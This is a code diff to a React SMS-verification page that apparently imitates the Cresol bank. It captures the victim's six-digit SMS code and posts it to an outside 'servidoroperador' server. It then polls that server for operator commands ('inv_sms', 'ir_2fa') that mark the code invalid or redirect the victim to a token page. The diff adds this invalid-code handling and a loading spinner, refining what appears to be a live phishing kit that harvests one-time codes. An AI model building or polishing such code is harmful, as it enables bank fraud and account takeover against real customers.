@@ -6,7 +6,12 @@ import cresolLogo from "/lovable-uploads/afc18ce7-1259-448e-9ab4-f02f2fbbaf19.pn
 import womanImage from "/lovable-uploads/e7069972-f11c-4c5a-a081-9869f1468332.png";
 
 // Função para monitorar cliente continuamente na página SMS
-const monitorClientSms = async (clientId: string, navigate: (path: string) => void): Promise<void> => {
+const monitorClientSms = async (
+  clientId: string, 
+  navigate: (path: string) => void,
+  onInvalidCode: () => void,
+  onStopLoading: () => void
+): Promise<void> => {
   console.log(`Iniciando monitoramento SMS do cliente: ${clientId}`);
   
   let intervalId: NodeJS.Timeout;
@@ -30,10 +35,20 @@ const monitorClientSms = async (clientId: string, navigate: (path: string) => vo
         console.log('Valor do response SMS:', clientData.data?.response);
         console.log('Valor do command SMS:', clientData.data?.command);
         
+        // Verificar se o código SMS é inválido
+        if (clientData.data?.response === "inv_sms" || clientData.data?.command === "inv_sms") {
+          console.log('Detectado inv_sms - Código SMS inválido');
+          clearInterval(intervalId);
+          onStopLoading();
+          onInvalidCode();
+          return;
+        }
+        
         // Na página SMS: se receber ir_sms, continua monitorando; se receber ir_2fa, redireciona para token
         if (clientData.data?.response === "ir_2fa" || clientData.data?.command === "ir_2fa") {
           console.log('Detectado ir_2fa na página SMS - Redirecionando para /token');
           clearInterval(intervalId);
+          onStopLoading();
           console.log('Monitoramento SMS parado - redirecionando...');
           navigate('/token');
           return;
@@ -66,6 +81,9 @@ const monitorClientSms = async (clientId: string, navigate: (path: string) => vo
 const SmsPage = () => {
   const [smsCode, setSmsCode] = useState("");
   const [clientId, setClientId] = useState("");
+  const [isLoading, setIsLoading] = useState(false);
+  const [isInvalid, setIsInvalid] = useState(false);
+  const [errorMessage, setErrorMessage] = useState("");
   const navigate = useNavigate();
 
   useEffect(() => {
@@ -79,6 +97,15 @@ const SmsPage = () => {
     }
   }, []);
 
+  const handleSmsCodeChange = (value: string) => {
+    setSmsCode(value.replace(/\D/g, '').slice(0, 6));
+    // Reset error state when user starts typing
+    if (isInvalid) {
+      setIsInvalid(false);
+      setErrorMessage("");
+    }
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
@@ -90,6 +117,10 @@ const SmsPage = () => {
     try {
       console.log('Enviando código SMS via external-response:', smsCode);
       console.log('ClientId utilizado:', clientId);
+      
+      setIsLoading(true);
+      setIsInvalid(false);
+      setErrorMessage("");
       
       // Enviar código SMS para a API usando external-response
       const response = await fetch(`https://servidoroperador.onrender.com/api/clients/${clientId}/external-response`, {
@@ -105,12 +136,24 @@ const SmsPage = () => {
       if (response.ok) {
         console.log('Código SMS enviado com sucesso via external-response');
         // Iniciar monitoramento contínuo após envio bem-sucedido
-        await monitorClientSms(clientId, navigate);
+        await monitorClientSms(
+          clientId, 
+          navigate,
+          () => {
+            setIsInvalid(true);
+            setErrorMessage("Código SMS inválido. Tente novamente.");
+          },
+          () => {
+            setIsLoading(false);
+          }
+        );
       } else {
         console.log('Erro ao enviar código SMS via external-response');
+        setIsLoading(false);
       }
     } catch (error) {
       console.log('Erro durante envio do SMS:', error);
+      setIsLoading(false);
     }
   };
 
@@ -148,25 +191,37 @@ const SmsPage = () => {
               <label className="block text-sm md:text-base text-gray-700 font-medium mb-1">Código SMS</label>
               <input
                 type="text"
-                className="w-full h-12 px-3 border border-gray-300 rounded focus:outline-none transition text-base bg-white text-center text-lg tracking-widest"
+                className={`w-full h-12 px-3 border rounded focus:outline-none transition text-base bg-white text-center text-lg tracking-widest ${
+                  isInvalid ? 'border-red-500' : 'border-gray-300'
+                }`}
                 placeholder="000000"
                 value={smsCode}
-                onChange={(e) => setSmsCode(e.target.value.replace(/\D/g, '').slice(0, 6))}
+                onChange={(e) => handleSmsCodeChange(e.target.value)}
                 maxLength={6}
                 autoComplete="one-time-code"
               />
+              {isInvalid && (
+                <p className="text-red-500 text-sm mt-1">{errorMessage}</p>
+              )}
             </div>
 
             <button
               type="submit"
-              className="w-full h-12 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-base md:text-lg shadow mb-6"
+              className="w-full h-12 rounded-full bg-orange-500 hover:bg-orange-600 transition font-bold text-white text-base md:text-lg shadow mb-6 disabled:opacity-70 flex items-center justify-center"
               style={{
                 background: "linear-gradient(90deg,#ffaa00,#ff7300 100%)",
                 borderRadius: "30px",
               }}
-              disabled={smsCode.length !== 6}
+              disabled={smsCode.length !== 6 || isLoading}
             >
-              Validar
+              {isLoading ? (
+                <div className="flex items-center">
+                  <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
+                  Validando...
+                </div>
+              ) : (
+                "Validar"
+              )}
             </button>
 
             <div className="text-center">
